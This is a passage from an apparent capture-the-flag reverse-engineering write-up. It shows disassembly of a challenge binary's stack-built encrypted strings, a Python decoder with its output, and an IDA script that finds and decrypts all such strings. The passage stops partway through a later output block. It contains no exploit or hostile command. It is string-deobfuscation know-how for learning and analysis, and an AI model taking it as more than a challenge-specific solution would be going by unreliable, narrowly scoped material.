<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sub_1401031A0:</span></span><br><span class="line"><span class="symbol">.text:</span>000000014010350C                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1F0h</span>+<span class="keyword">str</span>+<span class="number">110h</span>], <span class="number">3Eh</span> <span class="comment">; &#x27;&gt;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103517</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1F0h</span>+<span class="keyword">str</span>+<span class="number">108h</span>], <span class="number">16h</span> <span class="comment">; n22</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103651</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1F0h</span>+<span class="keyword">str</span>+<span class="number">10h</span>], <span class="number">18h</span> <span class="comment">; n24</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103659</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1F0h</span>+<span class="keyword">str</span>+<span class="number">8</span>], <span class="number">43h</span> <span class="comment">; &#x27;C&#x27; ; n67</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103661</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1F0h</span>+<span class="keyword">str</span>], <span class="number">57h</span> <span class="comment">; &#x27;W&#x27; ; n87</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103669</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">170h</span>+<span class="keyword">Str</span>] <span class="comment">; p_Str</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103670</span>                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">41h</span> <span class="comment">; &#x27;A&#x27;  ; n65</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140103676</span>                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">12h</span>        <span class="comment">; n18</span></span><br><span class="line"><span class="symbol">.text:</span>000000014010367C                 <span class="keyword">call</span>    decstr</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">main_loop:</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106A01                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">180h</span>], <span class="number">3Eh</span> <span class="comment">; &#x27;&gt;&#x27; ; n62</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106A0C                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">178h</span>], <span class="number">18h</span> <span class="comment">; n24</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>0000000140106BE0                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">10h</span>], <span class="number">43h</span> <span class="comment">; &#x27;C&#x27; ; n67</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106BE8                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">8</span>], <span class="number">4Bh</span> <span class="comment">; &#x27;K&#x27; ; n75</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106BF0                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr], <span class="number">53h</span> <span class="comment">; &#x27;S&#x27; ; n83</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106BF8                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">1290h</span>+var_1110] <span class="comment">; Buffer</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106BFF                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">4Ah</span> <span class="comment">; &#x27;J&#x27;  ; n74</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106C05                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">53h</span> <span class="comment">; &#x27;S&#x27;  ; n83</span></span><br><span class="line"><span class="symbol">.text:</span>0000000140106C0B                 <span class="keyword">call</span>    decstr_0</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140107459</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">1D8h</span>], <span class="number">3Eh</span> <span class="comment">; &#x27;&gt;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140107464</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">1D0h</span>], <span class="number">12h</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>00000001401076B1                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">10h</span>], <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076B9                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr+<span class="number">8</span>], <span class="number">11h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076C1                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">1310h</span>+arr], <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076C9                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">1290h</span>+var_1110] <span class="comment">; Buffer</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076D0                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">16h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076D6                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">7</span></span><br><span class="line"><span class="symbol">.text:</span>00000001401076DC                 <span class="keyword">call</span>    decstr_1</span><br></pre></td></tr></table></figure>

<p>These strings are encrypted, try to decrypt:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= x &lt;= <span class="number">25</span>: <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + x)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">87</span>: <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">67</span>: <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">62</span>: <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;\\x<span class="subst">&#123;x:02x&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">arr1 = [<span class="number">65</span>,<span class="number">18</span>,<span class="number">87</span>,<span class="number">67</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">67</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">21</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">67</span>,<span class="number">17</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">67</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">67</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">22</span>,<span class="number">62</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(dec(i) <span class="keyword">for</span> i <span class="keyword">in</span> arr1))</span><br><span class="line"></span><br><span class="line">arr2 = [<span class="number">74</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">75</span>,<span class="number">67</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">19</span>,<span class="number">67</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">19</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">67</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">67</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">62</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(dec(i) <span class="keyword">for</span> i <span class="keyword">in</span> arr2))</span><br><span class="line"></span><br><span class="line">arr3 = [<span class="number">22</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">8</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">67</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">24</span>,<span class="number">67</span>,<span class="number">19</span>,<span class="number">14</span>,<span class="number">67</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">65</span>,<span class="number">18</span>,<span class="number">62</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(dec(i) <span class="keyword">for</span> i <span class="keyword">in</span> arr3))</span><br></pre></td></tr></table></figure>

<p>This is just the program’s output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x41s, youll never recover the flag now.</span><br><span class="line">\x4a\x53\x53\x4b watchdog did not initialize. tampering likely.</span><br><span class="line">where control and identity align youll find the key to the \x41s.</span><br></pre></td></tr></table></figure>

<p>Try to find All encrypted strings:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_mov_to_stack_with_imm</span>(<span class="params">ea</span>):</span><br><span class="line">    insn = idaapi.insn_t()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> insn.itype != idaapi.NN_mov:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> insn.ops[<span class="number">0</span>].<span class="built_in">type</span> != idaapi.o_displ:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> insn.ops[<span class="number">1</span>].<span class="built_in">type</span> != idaapi.o_imm:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    reg_name = idaapi.get_reg_name(insn.ops[<span class="number">0</span>].reg, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> reg_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&quot;rsp&quot;</span>, <span class="string">&quot;rbp&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    disp = insn.ops[<span class="number">0</span>].addr</span><br><span class="line">    imm = insn.ops[<span class="number">1</span>].value &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">if</span> imm &gt; <span class="number">0xFF</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, disp, imm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_byte_at</span>(<span class="params">ea</span>):</span><br><span class="line">    b = idc.get_wide_byte(ea)</span><br><span class="line">    <span class="keyword">return</span> b <span class="keyword">if</span> b != idaapi.BADADDR <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= x &lt;= <span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + x)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">87</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">67</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">62</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;\\x<span class="subst">&#123;x:02x&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_mov_sequences</span>(<span class="params">min_length=<span class="number">4</span></span>):</span><br><span class="line">    seg = idaapi.get_segm_by_name(<span class="string">&quot;.text&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] .text segment not found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    start_ea = seg.start_ea</span><br><span class="line">    end_ea = seg.end_ea</span><br><span class="line">    ea = start_ea</span><br><span class="line">    results = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end_ea:</span><br><span class="line">        current_seq = []</span><br><span class="line">        prev_disp = <span class="literal">None</span></span><br><span class="line">        seq_start_ea = ea</span><br><span class="line">        temp_ea = ea</span><br><span class="line">        <span class="keyword">while</span> temp_ea &lt; end_ea:</span><br><span class="line">            ok, disp, imm = is_mov_to_stack_with_imm(temp_ea)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> current_seq:</span><br><span class="line">                <span class="keyword">if</span> prev_disp - disp != <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            current_seq.append((temp_ea, disp, imm))</span><br><span class="line">            prev_disp = disp</span><br><span class="line">            temp_ea = idc.next_head(temp_ea, end_ea)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(current_seq) &gt;= min_length:</span><br><span class="line">            last_mov_ea = current_seq[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">            r8_ea = last_mov_ea + <span class="number">0x11</span></span><br><span class="line">            r9_ea = last_mov_ea + <span class="number">0x6</span></span><br><span class="line">            r8_val = read_byte_at(r8_ea)</span><br><span class="line">            r9_val = read_byte_at(r9_ea)</span><br><span class="line">            <span class="keyword">if</span> r8_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> r9_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> r8_val &lt; <span class="number">127</span> <span class="keyword">and</span> r9_val &lt; <span class="number">127</span>:</span><br><span class="line">                    bytes_list = [entry[<span class="number">2</span>] <span class="keyword">for</span> entry <span class="keyword">in</span> current_seq]</span><br><span class="line">                    final_array = [r8_val, r9_val] + bytes_list[::-<span class="number">1</span>]</span><br><span class="line">                    decrypted = <span class="string">&#x27;&#x27;</span>.join(dec(x) <span class="keyword">for</span> x <span class="keyword">in</span> final_array)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;seq_start_ea:#x&#125;</span> -&gt; <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">                    results.append((seq_start_ea, final_array, decrypted))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] r8/r9 out of range at <span class="subst">&#123;seq_start_ea:#x&#125;</span>: r8=<span class="subst">&#123;r8_val&#125;</span>, r9=<span class="subst">&#123;r9_val&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to read r8/r9 at <span class="subst">&#123;seq_start_ea:#x&#125;</span>&quot;</span>)</span><br><span class="line">            ea = current_seq[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        ea = idc.next_head(ea, end_ea)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    results = find_mov_sequences(min_length=<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Total <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span> strings decoded.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span 